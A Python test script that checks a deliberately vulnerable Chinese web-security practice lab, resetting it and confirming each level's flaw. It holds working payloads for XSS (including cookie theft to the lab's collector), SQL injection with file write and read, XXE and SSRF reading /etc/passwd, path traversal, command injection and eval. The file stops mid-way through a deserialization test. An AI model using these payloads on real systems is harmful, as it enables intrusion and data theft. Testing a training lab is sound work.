# -*- coding: utf-8 -*-
"""
bafanglab - 全关卡一键自动化功能测试脚本
版权所有：八方网域-无涯
用法：python test_all.py [baseUrl]    默认 http://localhost/bafanglab
说明：脚本开头会调用 install.php（POST）重置环境（重建数据库/练习文件），随后逐项验证各关卡功能，
      每条用例使用的 payload 与响应摘录会写入 test_result_时间戳.txt（含分模块通过率与总通过率），
      退出码 0=全部通过，1=存在失败项。
依赖：requests（见 requirements.txt，run.bat 会自动安装）
"""
import base64
import os
import re
import sys
import time
import urllib.parse

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://localhost/bafanglab').rstrip('/')
ROOT = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(ROOT, 'uploads').replace('\\', '/')

# 跨平台系统文件路径（用于 XXE / SSRF / 任意文件读取等模块的 file:// 测试）
IS_WIN = sys.platform.startswith('win')
if IS_WIN:
    SYS_FILE_URL = 'file:///C:/Windows/win.ini'
    SYS_FILE_MARK = ('for 16-bit app support', '[fonts]')
    SYS_FILE_PATH = 'C:/Windows/win.ini'
else:
    SYS_FILE_URL = 'file:///etc/passwd'
    SYS_FILE_MARK = ('root:', 'daemon:')
    SYS_FILE_PATH = '/etc/passwd'

PASS = 0
FAIL = 0

# ---------- 测试报告：记录每条用例的 payload 与响应，输出 test_result_时间戳.txt ----------
REPORT_PATH = os.path.join(ROOT, 'test_result_%s.txt' % time.strftime('%Y%m%d_%H%M%S'))
_EXCERPT_LEN = 500        # PASS 用例的响应摘录长度
_EXCERPT_LEN_FAIL = 2000  # FAIL 用例的响应摘录长度（留足现场便于排错）
_REQ_LOG = []             # 全部 HTTP 请求记录 {method,url,payload,status,excerpt}
_CURSOR = 0               # 上一条 check 已消费到的请求下标
_SECTION = '（未分组）'
_SECTIONS = []            # 分模块统计 [[标题, 通过数, 失败数], ...]


def _fmt_payload(kw):
    """把请求关键字参数压成一行可读的 payload 描述"""
    parts = []
    if kw.get('params'):
        parts.append('params=%s' % (kw['params'],))
    if kw.get('data') is not None:
        parts.append('data=%s' % (kw['data'],))
    if kw.get('json') is not None:
        parts.append('json=%s' % (kw['json'],))
    if kw.get('files'):
        parts.append('files=%s' % (kw['files'],))
    if kw.get('headers'):
        h = dict((k, v) for k, v in kw['headers'].items() if k.lower() == 'cookie')
        if h:
            parts.append('headers=%s' % (h,))
    return ' ; '.join(parts)


def _find_echo(url, kw, text):
    """在响应正文里定位 payload 回显片段：拿请求中最具区分度的特征串去搜索，
    命中则截取前后文（±150/300 字符），未命中返回空串（仅记录响应开头摘录）"""
    marks = []

    def add(v):
        if isinstance(v, bytes):
            try:
                v = v.decode('utf-8', 'replace')
            except Exception:
                v = str(v)
        if isinstance(v, str) and len(v.strip()) >= 4:
            marks.append(v)

    for v in (kw.get('data'), kw.get('json')):
        if isinstance(v, dict):
            for x in v.values():
                add(x)
        elif v is not None:
            add(v)
    if kw.get('files'):
        for _name, tup in kw['files'].items():
            if isinstance(tup, tuple) and len(tup) >= 2:
                add(tup[0])   # 文件名
                add(tup[1])   # 文件内容
    try:
        q = urllib.parse.urlsplit(url).query
        for _k, v in urllib.parse.parse_qsl(q, keep_blank_values=True):
            add(v)
    except Exception:
        pass
    # 长候选优先：截取中段 40 字符做定位串（长 payload 在页面里可能被转义/截断）
    marks.sort(key=len, reverse=True)
    for m in marks:
        if len(m) > 40:
            mid = len(m) // 2
            m2 = m[mid - 20: mid + 20]
        else:
            m2 = m
        i = text.find(m2)
        if i >= 0:
            return text[max(0, i - 150): i + len(m2) + 300]
    return ''


_ORIG_SESSION_REQUEST = requests.Session.request


def _recorded_request(self, method, url, **kw):
    """包装 Session.request：所有请求（含 Session 与 requests.get/post）自动留痕"""
    resp = _ORIG_SESSION_REQUEST(self, method, url, **kw)
    try:
        # 剥掉 head/script/style，让摘录落在正文（payload 回显与判定关键字所在处）
        body = re.sub(r'<head\b.*?</head>', ' ', resp.text, flags=re.S | re.I)
        body = re.sub(r'<(script|style)\b.*?</\1>', ' ', body, flags=re.S | re.I)
        body = re.sub(r'<header\b.*?</header>', ' ', body, flags=re.S | re.I)
        flat = re.sub(r'\s+', ' ', body)   # 完整正文（供回显定位）
        text = flat[:_EXCERPT_LEN_FAIL]
        echo = _find_echo(url, kw, flat)
    except Exception:
        text = '<响应体读取失败>'
        echo = ''
    _REQ_LOG.append({
        'method': method.upper(),
        'url': url,
        'payload': _fmt_payload(kw),
        'status': resp.status_code,
        'excerpt': text,
        'echo': echo,
    })
    return resp


requests.Session.request = _recorded_request


def _report_header():
    with open(REPORT_PATH, 'w', encoding='utf-8') as f:
        f.write('bafanglab 自动化测试报告\n')
        f.write('=' * 60 + '\n')
        f.write('目标地址: %s\n' % BASE)
        f.write('开始时间: %s\n' % time.strftime('%Y-%m-%d %H:%M:%S'))
        f.write('运行平台: %s\n' % sys.platform)
        f.write('说明: 每条用例记录判定结果、请求、payload 与响应摘录'
                '（PASS 截取 %d 字符，FAIL 截取 %d 字符）\n'
                % (_EXCERPT_LEN, _EXCERPT_LEN_FAIL))
        f.write('=' * 60 + '\n\n')


_report_header()

requests.packages.urllib3.disable_warnings()  # noqa


def section(title):
    """进入新的测试分组：控制台打印分隔行，报告按组统计通过率"""
    global _SECTION
    _SECTION = title
    print('\n-- %s --' % title)


def check(name, cond, extra=''):
    """判定并记录一条用例：控制台打印 + 写入报告文件（含 payload 与响应摘录）"""
    global PASS, FAIL, _CURSOR
    if cond:
        PASS += 1
        tag = 'PASS'
    else:
        FAIL += 1
        tag = 'FAIL'
    # 分模块统计（section() 换段后自动新建一组）
    if not _SECTIONS or _SECTIONS[-1][0] != _SECTION:
        _SECTIONS.append([_SECTION, 0, 0])
    _SECTIONS[-1][1 if cond else 2] += 1
    print('[%s] %s%s' % (tag, name, '  (%s)' % extra if extra else ''))
    # 本次判定涉及的请求：自上一条 check 以来的全部 HTTP 交互
    reqs = _REQ_LOG[_CURSOR:]
    _CURSOR = len(_REQ_LOG)
    lim = _EXCERPT_LEN if cond else _EXCERPT_LEN_FAIL
    with open(REPORT_PATH, 'a', encoding='utf-8') as f:
        f.write('[%s] %s\n' % (tag, name))
        if extra:
            f.write('  判定依据: %s\n' % extra)
        if reqs:
            for rq in reqs:
                f.write('  请求: %s %s\n' % (rq['method'], rq['url']))
                if rq['payload']:
                    f.write('  payload: %s\n' % rq['payload'])
                f.write('  响应: HTTP %s | %s\n' % (rq['status'], rq['excerpt'][:lim]))
                if rq.get('echo'):
                    f.write('  回显: …%s…\n' % rq['echo'])
        else:
            f.write('  请求: （本次判定未发起新请求，沿用上文响应）\n')
        f.write('\n')


def get(path, **kw):
    return requests.get(BASE + path, timeout=30, verify=False,
                        headers={'User-Agent': 'bafanglab-auto-test/1.0'}, **kw)


def post(path, data=None, **kw):
    return requests.post(BASE + path, data=data, timeout=30, verify=False,
                         headers={'User-Agent': 'bafanglab-auto-test/1.0'}, **kw)


def site_rel(href):
    """把页面里的链接（绝对 URL 或 /部署目录/... 相对路径）转成站点内相对路径"""
    p = re.sub(r'^https?://[^/]+', '', href)
    bp = re.sub(r'^https?://[^/]+', '', BASE).rstrip('/')
    return p[len(bp):] if bp and p.startswith(bp) else p


print('=' * 60)
print(' bafanglab 全关卡自动化测试    目标：%s' % BASE)
print(' 详细报告：%s' % REPORT_PATH)
print('=' * 60)

# ---------- 0. 重置环境 ----------
section('[0] 环境重置（install.php）')
r = post('/install.php')
check('install.php 重置环境', r.status_code == 200 and '安装完成' in r.text, 'HTTP %d' % r.status_code)

# ---------- 1. 全部关卡页面可达性 + 学习辅助按钮 ----------
section('[1] 关卡页面可达性（31页，含学习辅助按钮）')
pages = [
    '/modules/burp/index.php', '/modules/burp/response.php',
    '/modules/burp/replay.php', '/modules/burp/price.php',
    '/modules/dirscan/index.php', '/modules/fuzz/index.php',
    '/modules/jsleak/index.php', '/modules/jsleak/unauth.php',
    '/modules/brute/index.php', '/modules/brute/captcha.php',
    '/modules/xss/reflect.php', '/modules/xss/stored.php', '/modules/xss/dom.php',
    '/modules/xss/upload.php', '/modules/xss/platform.php',
    '/modules/sqli/get.php', '/modules/sqli/post.php', '/modules/sqli/error.php',
    '/modules/sqli/blind.php', '/modules/sqli/time.php', '/modules/sqli/outfile.php',
    '/modules/xxe/index.php', '/modules/upload/index.php', '/modules/fileinc/index.php',
    '/modules/csrf/index.php', '/modules/ssrf/index.php', '/modules/fileread/index.php',
    '/modules/rce/index.php', '/modules/rce/code.php', '/modules/unserialize/index.php',
    '/modules/ssti/index.php',
]
# Burp 练习页 / XSS 平台 / 目录扫描 / 参数 Fuzz 不提供「漏洞源码」，只保留「修复示例」
no_src_pages = ['/modules/burp/index.php', '/modules/burp/response.php',
                '/modules/burp/replay.php', '/modules/burp/price.php',
                '/modules/xss/platform.php',
                '/modules/dirscan/index.php', '/modules/fuzz/index.php']
# 纯教学介绍页（无练习、无漏洞源码、无修复示例），仅检查 HTTP 200
intro_pages = ['/modules/burp/protocol.php', '/modules/burp/encode.php',
               '/modules/burp/dnslog.php']
src_pages = [p for p in pages if p not in no_src_pages and p not in intro_pages]
bad = []
for p in src_pages:
    r = get(p)
    t = r.text
    if r.status_code != 200 or 'btn-code' not in t or 'btn-fix' not in t \
            or 'id="lvlSrc"' not in t or 'id="lvlFix"' not in t:
        bad.append('%s(HTTP %d)' % (p, r.status_code))
check('%d 个关卡页面 200 且学习辅助按钮/源码弹窗齐全' % len(src_pages), not bad,
      '异常: ' + ', '.join(bad) if bad else '全部正常')
bad = []
for p in no_src_pages:
    r = get(p)
    t = r.text
    if r.status_code != 200 or 'btn-code' in t or 'id="lvlSrc"' in t \
            or 'btn-fix' not in t or 'id="lvlFix"' not in t:
        bad.append('%s(HTTP %d)' % (p, r.status_code))
check('Burp/目录扫描/参数Fuzz 已移除漏洞源码、保留修复示例', not bad,
      '异常: ' + ', '.join(bad) if bad else '全部正常')
bad = []
for p in intro_pages:
    r = get(p)
    if r.status_code != 200:
        bad.append('%s(HTTP %d)' % (p, r.status_code))
check('%d 个教学介绍页 HTTP 200' % len(intro_pages), not bad,
      '异常: ' + ', '.join(bad) if bad else '全部正常')
# 三个知识页标题只保留本页名称（无模块前缀、无关卡数徽标）
bad_titles = []
for p, title in (('/modules/burp/protocol.php', '网络协议入门'),
                 ('/modules/burp/encode.php', '编码基础'),
                 ('/modules/burp/dnslog.php', 'OOB和DNSLog')):
    r = get(p)
    if ('<title>%s - bafanglab</title>' % title) not in r.text \
            or ('<h2>%s</h2>' % title) not in r.text \
            or 'lvl-badge' in r.text:
        bad_titles.append(p)
check('三个知识页标题仅保留本页名称且无 levels 徽标', not bad_titles,
      '异常: ' + ', '.join(bad_titles) if bad_titles else '全部正常')
# 已删除的汇总页 / 已改名的旧路径必须 404，避免死链
for p in ('/modules/burp/basic.php', '/modules/burp/intro.php'):
    check('旧路径 %s 返回 404' % p, get(p).status_code == 404)
# 关卡数单一数据源：首页徽标 = 各模块入口页页签数（单页模块为 1），模块页/关卡页徽标一致
r = get('/index.php')
counts = [int(x) for x in re.findall(r'class="lvl-badge"[^>]*>(\d+)</span>', r.text)]
check('首页 16 个模块关卡数角标顺序正确（Burp 4 / XSS 5 / SQLi 6）',
      counts == [4, 1, 1, 2, 2, 5, 6, 1, 1, 1, 1, 1, 1, 2, 1, 1], counts)
# 角标必须只显示数字 + 有可访问名称（不再出现 LEVELS 单位文字）
check('首页关卡数角标仅数字且带 aria-label',
      'LEVELS' not in r.text and 'aria-label="4 个关卡"' in r.text
      and 'lvl-badge-unit' not in r.text)

# 徽标值必须可从 tabs.php 的页签数推导：入口页页签数 = 首页徽标
entries = re.findall(r'<a class="btn" href="([^"]+)">', r.text)
cards = r.text.count('class="card-actions"')
slug_badge = {}
bad_tabs = []
for href, n in zip(entries, counts):
    rel = site_rel(href)
    slug_badge['/'.join(rel.split('/')[:3])] = n
    page = get(rel).text
    m = re.search(r'<div class="tabs">(.*?)</div>', page, re.S)
    tabs = len(re.findall(r'class="tab[ "]', m.group(1))) if m else 0
    if tabs == 0:
        tabs = 1   # 单页模块没有页签，按 1 个关卡计
    if tabs != n:
        bad_tabs.append('%s(徽标 %d / 页签 %d)' % (rel, n, tabs))
check('模块页徽标数与 tabs.php 页签数一致（%d 个模块）' % len(entries),
      cards == 16 and len(entries) == 16 and not bad_tabs,
      '异常: ' + '; '.join(bad_tabs) if bad_tabs else '%d 个模块全部一致' % len(entries))

# 关卡页/模块页显示的徽标必须与首页一致（防止三处各写一份数字）
check_pages = list(src_pages) + [site_rel(e) for e in entries]
bad_page_badge = []
for p in check_pages:
    found = re.findall(r'aria-label["\s,=]*(\d+) 个关卡', get(p).text)
    exp = slug_badge.get('/'.join(p.split('/')[:3]))
    if exp is None or [int(x) for x in found] != [exp]:
        bad_page_badge.append('%s(期望 %s / 实际 %s)' % (p, exp, found))
check('关卡页/模块页徽标与首页徽标完全一致（%d 页）' % len(check_pages),
      not bad_page_badge,
      '异常: ' + '; '.join(bad_page_badge) if bad_page_badge else '全部一致')
# DNSLog 知识页内容：原理、常见平台、10 类漏洞 payload
r = get('/modules/burp/dnslog.php')
check('DNSLog 页含原理/平台/漏洞清单',
      all(k in r.text for k in ('DNSLog 的原理', 'dnslog.cn', 'webhook.site',
                               'DNSLog 平台可以验证的漏洞')))
check('DNSLog 漏洞清单含 10 类 payload',
      len(re.findall('<td><pre>', r.text)) == 10 and 'abcdef.dnslog.cn' in r.text,
      '%d 行' % len(re.findall('<td><pre>', r.text)))
bad = []
for p in pages:
    r = get(p)
    t = r.text
    if r.status_code != 200 or 'class="level-goal"' not in t or 'class="goal-flag"' not in t:
        bad.append('%s(HTTP %d)' % (p, r.status_code))
check('全部 %d 个关卡页均有目标色块与红旗图标' % len(pages), not bad,
      '异常: ' + ', '.join(bad) if bad else '全部正常')

# ---------- 2. 模块1 Burp ----------
section('[2] 模块1 Burp 抓包基本功（纯文本接口）')
r = get('/modules/burp/api/ex1.php?role=user')
check('练习1 普通用户被拒绝', 'status=fail' in r.text and '无权查看机密内容' in r.text, 'text/plain')
r = get('/modules/burp/api/ex1.php?role=admin')
check('练习1 GET 改包越权', 'status=ok' in r.text and '恭喜你完成本关挑战！' in r.text)
r = get('/modules/burp/api/ex3.php')
check('练习3 接口为纯文本 vip=false 且不含通关凭证',
      'vip=false' in r.text and 'flag{' not in r.text)
r = get('/modules/burp/response.php')
check('练习3 页面 fetch 接口且通关凭证仅以 base64 预置',
      'api/ex3.php' in r.text and 'flag{r3sp0ns3_m0d1f13d}' not in r.text
      and '5oGt5Zac5L2g5a6M5oiQ5pys5YWz5oyR5oiY77yB' in r.text)
r = post('/modules/burp/api/ex2.php', {'buy': '1', 'goods_id': '1', 'price': '0.01'})
check('练习2 修改POST请求（金额篡改）', '0.01 买到了价值' in r.text)
s = requests.Session()
r1 = s.get(BASE + '/modules/burp/replay.php', timeout=30, verify=False)
token = r1.text.split('id="tkField" value="')[1].split('"')[0]
r = s.post(BASE + '/modules/burp/api/ex4.php', data={'do_transfer': '1', 'token': token, 'amount': '100'},
           timeout=30, verify=False)
check('练习4 首次转账成功', 'status=ok' in r.text)
r = s.post(BASE + '/modules/burp/api/ex4.php', data={'do_transfer': '1', 'token': token, 'amount': '100'},
           timeout=30, verify=False)
check('练习4 原样重放被识别', 'status=replay' in r.text and '重放' in r.text)

# 编码基础教学页：选项卡位置 + 四大知识模块 + 速查表数据准确性
r = get('/modules/burp/encode.php')
base_path = urllib.parse.urlparse(BASE).path.rstrip('/')
check('编码基础页面可访问且选项卡激活',
      r.status_code == 200
      and 'class="tab active" href="%s/modules/burp/encode.php"' % base_path in r.text)
check('知识页选项卡按协议→编码→DNSLog 排序',
      -1 < r.text.find('/modules/burp/protocol.php') < r.text.find('/modules/burp/encode.php')
      < r.text.find('/modules/burp/dnslog.php'))
r = get('/modules/burp/index.php')
check('练习页不再展示知识子页选项卡',
      '/modules/burp/protocol.php' not in r.text and '/modules/burp/encode.php' not in r.text
      and '/modules/burp/dnslog.php' not in r.text)
# 模块1 练习页签：新顺序为 练习1 → 练习2（修改POST请求）→ 练习3（修改响应）→ 练习4（请求重放）
check('模块1 练习页签顺序与文案正确',
      all(k in r.text for k in ('练习1 · 修改GET请求', '练习2 · 修改POST请求',
                                '练习3 · 修改响应', '练习4 · 请求重放'))
      and -1 < r.text.find('/modules/burp/price.php')
      < r.text.find('/modules/burp/response.php') < r.text.find('/modules/burp/replay.php'))
for page, title in (('/modules/burp/price.php', 'Burp 练习2 · 修改POST请求'),
                    ('/modules/burp/response.php', 'Burp 练习3 · 修改响应'),
                    ('/modules/burp/replay.php', 'Burp 练习4 · 请求重放')):
    rp = get(page)
    check('模块1 页面标题序号正确（%s）' % page.split('/')[-1],
          rp.status_code == 200 and '<title>%s - bafanglab</title>' % title in rp.text)
r = get('/modules/burp/encode.php')
check('编码基础含四个知识模块',
      all(k in r.text for k in ('HTML 实体编码', 'URL 编码', 'Base64 编码', 'ASCII 编码')))
# 速查表每行五列：字符 / 十进制 / 十六进制 / URL 编码 / HTML 实体
rows = re.findall(
    r'<tr><td><code>(.*?)</code></td><td>(\d+)</td><td><code>0x([0-9A-F]+)</code></td>'
    r'<td><code>(%\w{2})</code></td><td><code>(.*?)</code></td></tr>', r.text)
check('速查表共 95 行（数字10 + 大写26 + 小写26 + 符号33）', len(rows) == 95, '%d 行' % len(rows))
check('速查表十进制/十六进制/URL 编码自洽',
      all(int(dec) == int(hexv, 16) and url == '%%%02X' % int(dec) for _, dec, hexv, url, _ in rows))
anch = {row[0]: row for row in rows}
check('速查表锚点 A=65 / 0x41 / %41 / &amp;#65;',
      'A' in anch and anch['A'][1] == '65' and anch['A'][2] == '41'
      and anch['A'][3] == '%41' and anch['A'][4] == '&amp;#65;')
check('速查表锚点 a=97 / 0=48 / ~=126',
      'a' in anch and anch['a'][1] == '97' and '0' in anch and anch['0'][1] == '48'
      and '~' in anch and anch['~'][1] == '126' and anch['~'][3] == '%7E')
check('速查表特殊字符使用命名实体',
      '空格（SP）' in anch and anch['空格（SP）'][4] == '&amp;#32;'
      and '&lt;' in anch and anch['&lt;'][4] == '&amp;lt;'
      and '&amp;' in anch and anch['&amp;'][4] == '&amp;amp;'
      and '&quot;' in anch and anch['&quot;'][4] == '&amp;quot;'
      and '&#039;' in anch and anch['&#039;'][4] == '&amp;#39;'
      and '&gt;' in anch and anch['&gt;'][4] == '&amp;gt;')

# ---------- 3. 模块2 目录扫描 ----------
section('[3] 模块2 目录扫描')
r = get('/backup/db_backup.sql')
check('backup/db_backup.sql 隐藏账号', 'sysadmin' in r.text)
r = get('/admin_area/')
check('admin_area 隐藏后台通关凭证', '恭喜你完成本关挑战！' in r.text)
r = get('/robots.txt')
check('robots.txt 线索', 'Disallow: /backup/' in r.text)
r = get('/backup/.git/HEAD')
check('示例仓库 backup/.git/HEAD 泄露', r.status_code == 200 and 'ref: refs/heads/master' in r.text)
r = get('/backup/.git/logs/HEAD')
check('backup/.git/logs/HEAD 提交记录可读', 'commit (initial)' in r.text and '删除敏感文件' in r.text)
r = get('/.git/HEAD')
check('靶场自身 .git 已被 403 保护', r.status_code == 403, 'HTTP %d' % r.status_code)

# ---------- 4. 模块3 参数 Fuzz ----------
section('[4] 模块3 参数 Fuzz')
r = get('/modules/fuzz/index.php')
check('参数 Fuzz 未传条件提示「请输入查询条件」',
      '<div class="result warn">请输入查询条件。</div>' in r.text
      and '暂未发现隐藏参数' not in r.text)
r = get('/modules/fuzz/index.php?debug=3')
check('参数存在但值不对提示「找不到对应的数据」',
      '<div class="result warn">找不到对应的数据。</div>' in r.text
      and '暂未发现隐藏参数' not in r.text)
r = get('/modules/fuzz/index.php?id=1')
check('默认 ?id=1 仍返回一条数据', '<div class="result">' in r.text and '普通参数 id=1' in r.text)
r = get('/modules/fuzz/index.php?admin=true')
check('隐藏参数 admin=true', '<b>admin</b>！已获得管理员视图' in r.text)
r = get('/modules/fuzz/index.php?debug=1&source=1')
check('隐藏参数 debug/source 有响应', '发现隐藏参数 <b>debug</b>' in r.text and '<b>source</b>' in r.text)
r = get('/modules/fuzz/index.php?id=1&debug=1')
check('多个正确查询条件叠加输出',
      '普通参数 id=1' in r.text and '发现隐藏参数 <b>debug</b>' in r.text
      and '<div class="result warn">' not in r.text)

# ---------- 5. 模块4 JS 敏感信息泄露 ----------
section('[5] 模块4 JS 敏感信息泄露')
r = get('/modules/jsleak/assets/app.js')
check('app.js 含硬编码 AK', 'LTAI5tB8fAnGLaBFakeKey01' in r.text)
r = post('/modules/jsleak/index.php', {
    'check_oss': '1',
    'ak': 'LTAI5tB8fAnGLaBFakeKey01',
    'sk': 'FakeSecretBafangLab2026AbCdEfGh',
})
check('AK/SK 校验接口', '<div class="msg success">凭证校验通过' in r.text)
r = get('/modules/jsleak/api/users.php')
check('未授权接口 users.php', '恭喜你完成本关挑战！' in r.text, 'JSON 返回')

# ---------- 6. 模块5 密码暴力猜解 ----------
section('[6] 模块5 密码暴力猜解')
s = requests.Session()
r = s.post(BASE + '/modules/brute/index.php', data={'username': 'admin', 'password': 'wrongpass'},
           timeout=30, verify=False)
check('错误密码拒绝登录', '欢迎 admin（admin）' not in r.text)
r = s.post(BASE + '/modules/brute/index.php', data={'username': 'admin', 'password': 'admin123'},
           timeout=30, verify=False)
check('正确密码登录成功', '欢迎 admin（admin）' in r.text)
r = get('/modules/brute/captcha.php')
check('验证码版页面正常', r.status_code == 200 and '验证码' in r.text)

# ---------- 7. 模块6 XSS ----------
section('[7] 模块6 XSS')
xss_ref = '<script>alert(31337)</script>'
r = get('/modules/xss/reflect.php?q=' + urllib.parse.quote(xss_ref))
check('反射型 XSS 无过滤回显', xss_ref in r.text)
xss_st = '<script>alert(31338)</script>'
post('/modules/xss/stored.php', {'nickname': 'auto_test', 'content': xss_st})
r = get('/modules/xss/stored.php')
check('存储型 XSS 留言未过滤', xss_st in r.text)
r = get('/modules/xss/dom.php')
check('DOM 型 XSS 通关凭证存在', '恭喜你完成本关挑战！' in r.text)
# 上传型 XSS：上传含 <script> 的 html 文件，view.php 原样输出触发 XSS
xss_up = '<script>alert(31339)</script>'
r = requests.post(BASE + '/modules/xss/upload.php', timeout=30, verify=False,
                  files={'upfile': ('auto_xss.html', xss_up.encode(), 'text/html')})
check('上传型 XSS html 上传成功', '上传成功' in r.text and 'view.php' in r.text)
r = get('/modules/xss/view.php?f=' + urllib.parse.quote('auto_xss.html'))
check('上传型 XSS view.php 原样输出脚本', xss_up in r.text)
# 删除项：页面提供「删除」链接，删除后文件不可再访问
r = get('/modules/xss/upload.php')
check('上传型 XSS 列表提供删除项', 'upload.php?del=' in r.text)
r = get('/modules/xss/upload.php?del=' + urllib.parse.quote('auto_xss.html'))
check('上传型 XSS 删除后文件不可访问',
      get('/modules/xss/view.php?f=' + urllib.parse.quote('auto_xss.html')).text.find(xss_up) == -1)

# XSS 平台：托管 payload → 模拟回连 → 收信记录出现通关凭证
sx = requests.Session()
r = sx.get(BASE + '/modules/xss/platform.php', timeout=30, verify=False)
check('XSS 平台页含收信地址与托管表单',
      r.status_code == 200 and '收信地址' in r.text and 'name="payload"' in r.text)
tok = re.search(r'platform\.php\?rx=([a-f0-9]+)', r.text)
xss_tok = tok.group(1) if tok else ''
r = sx.post(BASE + '/modules/xss/platform.php?t=' + xss_tok,
            data={'payload': "<script>new Image().src='/bafanglab/modules/xss/platform.php?rx=%s&c='+document.cookie;</script>" % xss_tok},
            timeout=30, verify=False)
check('XSS 平台托管 payload 成功', '托管成功' in r.text)
r = get('/uploads/xss/platform/%s.html' % xss_tok)
check('托管地址可访问且原样输出脚本', r.status_code == 200 and 'new Image()' in r.text)
r = get('/modules/xss/platform.php?rx=%s&c=%s' % (xss_tok, urllib.parse.quote('xss_upload_pass=恭喜你完成本关挑战！')))
r = sx.get(BASE + '/modules/xss/platform.php?t=' + xss_tok, timeout=30, verify=False)
check('XSS 平台收信记录带回通关凭证', '通关成功' in r.text)
for _f in ('%s.html' % xss_tok, '%s.log' % xss_tok):
    try:
        os.remove(os.path.join(UPLOAD_DIR, 'xss', 'platform', _f))
    except OSError:
        pass

# ---------- 8. 模块7 SQL 注入 ----------
section('[8] 模块7 SQL 注入')
r = get('/modules/sqli/get.php?id=1')
check('GET 数字型正常查询', 'admin@bafanglab.local' in r.text)
r = get('/modules/sqli/get.php?id=' + urllib.parse.quote('-1 UNION SELECT 1,secret,3,4 FROM secrets-- -'))
check('GET 联合注入取通关凭证', '恭喜你完成本关挑战！' in r.text)
r = post('/modules/sqli/post.php', {'username': "admin' or '1'='1", 'password': 'x'})
check('POST 万能密码绕过', '当前身份：admin' in r.text)
r = get('/modules/sqli/error.php?id=' + urllib.parse.quote("1'"))
check('报错注入回显 MySQL 错误', 'SQL syntax' in r.text or 'error' in r.text.lower())
r = get('/modules/sqli/blind.php?name=' + urllib.parse.quote("admin' and 1=1-- -"))
t1 = '<b style="color:var(--success)">存在</b>' in r.text
r = get('/modules/sqli/blind.php?name=' + urllib.parse.quote("admin' and 1=2-- -"))
t2 = '不存在' in r.text
check('布尔盲注真假分支', t1 and t2)
start = time.time()
get('/modules/sqli/time.php?name=' + urllib.parse.quote("admin' and sleep(2)-- -"))
sec = time.time() - start
check('时间盲注 sleep(2) 延迟', sec >= 1.8, '耗时 %.2fs' % sec)

# 文件读写：写入框走 UNION + INTO OUTFILE 写出 flag.txt，读取框走 UNION + LOAD_FILE 注入回读
SQLI_FILES = os.path.join(ROOT, 'modules', 'sqli', 'files').replace('\\', '/')
sqli_flag = SQLI_FILES + '/flag.txt'
try:
    os.remove(sqli_flag)
except OSError:
    pass
r = get('/modules/sqli/get.php')
check('SQL 注入模块共 6 个子关选项卡', '/modules/sqli/outfile.php' in r.text and '文件读写' in r.text)
payload_w = ("-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 "
             "INTO OUTFILE '%s'" % sqli_flag)
r = get('/modules/sqli/outfile.php?step=write&w=' + urllib.parse.quote(payload_w))
check('文件读写「写入」框 INTO OUTFILE 落地成功',
      r.status_code == 200 and '文件已落地' in r.text, 'HTTP %d' % r.status_code)
r = get('/modules/sqli/files/flag.txt')
check('写出的 flag.txt 可访问且含通关凭证',
      r.status_code == 200 and '恭喜你完成本关挑战！' in r.text, 'HTTP %d' % r.status_code)
payload_r = "-1 UNION SELECT 1,LOAD_FILE('%s'),3,4" % sqli_flag
r = get('/modules/sqli/outfile.php?step=read&r=' + urllib.parse.quote(payload_r))
check('「读取」框 LOAD_FILE 注入回读并判定通关',
      '通关成功' in r.text and 'LOAD_FILE 注入读回的内容' in r.text)
r = get('/modules/sqli/outfile.php')
check('文件读写页含目标色块与写/读两个输入框',
      r.status_code == 200 and 'class="level-goal"' in r.text
      and 'name="w"' in r.text and 'name="r"' in r.text)
try:
    os.remove(sqli_flag)
except OSError:
    pass

# ---------- 9. 模块8 XXE ----------
section('[9] 模块8 XXE 外部实体注入')
xml = ('<?xml version="1.0"?><!DOCTYPE user [ <!ENTITY xxe SYSTEM "%s"> ]>'
       '<user><name>&xxe;</name><email>a@a.com</email></user>') % SYS_FILE_URL
r = post('/modules/xxe/index.php', {'xml': xml})
check('XXE 读系统文件', '解析成功' in r.text and any(m in r.text for m in SYS_FILE_MARK))

# ---------- 10. 模块9 文件上传 ----------
section('[10] 模块9 文件上传')
r = requests.post(BASE + '/modules/upload/index.php', timeout=30, verify=False,
                  files={'upfile': ('shell.php', b'<?php phpinfo();?>', 'application/x-php')})
check('黑名单拦截 .php', '不允许上传' in r.text)
r = requests.post(BASE + '/modules/upload/index.php', timeout=30, verify=False,
                  files={'upfile': ('test_auto.jpg', b'GIF89a auto test image\n', 'image/jpeg')})
check('jpg 正常上传', '上传成功' in r.text)
try:
    os.remove(os.path.join(UPLOAD_DIR, 'test_auto.jpg'))
except OSError:
    pass

# ---------- 11. 模块10 文件包含 ----------
section('[11] 模块10 文件包含')
r = get('/modules/fileinc/index.php?page=pages/about.php')
check('正常包含 about.php', '关于我们' in r.text)
r = get('/modules/fileinc/index.php?page='
        + urllib.parse.quote('php://filter/read=convert.base64-encode/resource=../../config.php'))
check('php://filter 读源码', 'PD9waH' in r.text)

# ---------- 12. 模块11 CSRF ----------
section('[12] 模块11 CSRF')
s = requests.Session()
s.post(BASE + '/modules/csrf/index.php', data={'username': 'test', 'password': '123456', 'login': '1'},
       timeout=30, verify=False)
r = s.get(BASE + '/modules/csrf/index.php?newemail=auto_csrf@bafanglab.local', timeout=30, verify=False)
check('GET 改邮箱（无 token 防护）', '邮箱已修改为：auto_csrf@bafanglab.local' in r.text)

# ---------- 13. 模块12 SSRF ----------
section('[13] 模块12 SSRF')
r = get('/modules/ssrf/index.php?url=' + urllib.parse.quote(SYS_FILE_URL))
check('SSRF file:// 读文件', any(m in r.text for m in SYS_FILE_MARK))

# ---------- 14. 模块13 任意文件读取 ----------
section('[14] 模块13 任意文件读取')
r = get('/modules/fileread/index.php?file=readme.txt')
check('正常读取 files/readme.txt', '公共文件目录说明' in r.text)
r = get('/modules/fileread/index.php?file=' + urllib.parse.quote('../../../config.php'))
check('目录穿越读 config.php', 'DB_PASS' in r.text)

# ---------- 15. 模块14 RCE ----------
section('[15] 模块14 命令/代码执行')
r = get('/modules/rce/index.php?ip=' + urllib.parse.quote('127.0.0.1 & echo RCEOK123'))
check('命令拼接执行', 'RCEOK123' in r.text)
r = post('/modules/rce/code.php', {'code': "echo 'EVALOK456';"})
check('eval 代码执行', 'EVALOK456' in r.text)

# ---------- 16. 模块15 反序列化 ----------
section('[16] 模块15 PHP 反序列化')
uns_file = UPLOAD_DIR + '/uns_auto.txt'
try:
    os.remove(uns_file)
except OSError:
    pass
